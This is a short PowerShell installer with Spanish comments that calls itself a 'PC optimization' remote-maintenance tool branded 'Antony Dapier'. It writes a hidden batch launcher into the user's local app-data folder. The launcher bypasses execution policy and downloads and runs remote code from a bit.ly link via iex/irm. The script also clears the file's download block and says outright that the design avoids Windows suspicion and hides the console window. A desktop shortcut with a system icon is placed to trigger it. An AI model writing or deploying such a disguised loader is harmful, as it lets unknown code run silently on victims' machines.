# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo
$AppDir = Join-Path $env:LOCALAPPDATA "AntonyDapier"
$BatFile = Join-Path $AppDir "run_mantenimiento.bat"

# 1. Crear carpeta local si no existe
if (-not (Test-Path $AppDir)) { New-Item -ItemType Directory -Path $AppDir -Force | Out-Null }

# 2. Crear un lanzador por lotes (.bat)
# Esto es mucho menos "sospechoso" para Windows que un comando directo en el acceso directo
$BatContent = @"
@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (irm https://bit.ly/mandia-windows)"
"@
$BatContent | Set-Content -Path $BatFile -Force
Unblock-File -Path $BatFile

# 3. Crear el acceso directo apuntando al archivo .bat
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $BatFile
$Shortcut.IconLocation = "imageres.dll,109"
$Shortcut.WindowStyle = 7 # Minimizado para evitar el flash negro
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

[System.Windows.Forms.MessageBox]::Show("¡Instalación completada!`n`nEl acceso directo está listo en tu escritorio.", "Antony Dapier")
